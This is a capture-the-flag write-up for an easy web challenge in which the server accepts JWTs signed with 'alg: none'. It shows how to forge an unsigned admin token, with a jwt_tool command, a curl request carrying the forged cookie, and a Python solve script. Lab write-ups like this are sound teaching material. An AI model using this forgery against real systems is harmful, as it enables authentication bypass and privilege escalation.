# Writeup: Discord Nitro 

## Infomation

**Category:** Web
**Difficulty:** Easy 

## Summary
The site uses a JWT stored in the `token` cookie to remember who you are. The server rolls its
own JWT verification and **accepts tokens with the header `alg: none`** — meaning it skips
signature checking. A player forges a token with `alg=none` and `role=admin` to reach `/admin`
and read the flag.

## Steps

### 1. Recon
- Log in with `guest / guest`.
- Visit `/home` and see `role: user`. Visiting `/admin` is blocked: "only admins can view the flag".
- Open DevTools → Application → Cookies and find the `token` cookie shaped like `eyJ...` → this is a **JWT**.

### 2. Understand the JWT
The cookie has 3 parts separated by dots: `header.payload.signature` (base64url).
Decoding the payload shows: `{"user":"guest","role":"user"}`.
If you only change `role` to `admin` while keeping `alg: HS256`, the signature becomes invalid → the server rejects it.

### 3. Exploit `alg=none`
Craft a new token:
- Header: `{"alg":"none","typ":"JWT"}`
- Payload: `{"user":"guest","role":"admin"}`
- Signature: **left empty**

Join them into `base64url(header).base64url(payload).` (ending with a dot, no signature).

Quick way with `jwt_tool`:
```bash
jwt_tool <old_token> -X a   # auto-generate the alg=none variant
```
Then change `role` to `admin`.

Or do it by hand with the included script: `python solve.py http://<host>:<port>`.

### 4. Get the flag
Set the `token` cookie to the forged token and visit `/admin`:
```bash
curl http://<host>:<port>/admin \
  -H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ."
```
→ returns the flag.

## Scripts

```python
#!/usr/bin/env python3
import re
import sys
import json
import base64
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8000"


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"user": "guest", "role": "admin"}).encode())
forged = f"{header}.{payload}."
print("[+] Token:", forged)

req = urllib.request.Request(f"{BASE}/admin", headers={"Cookie": f"token={forged}"})
html = urllib.request.urlopen(req).read().decode()

m = re.search(r"FLAG\{[^}]+\}", html)
print("[+] Flag:", m.group(0) if m else "fail")
```

Run:

```bash
python3 solve.py http:///ip:port
```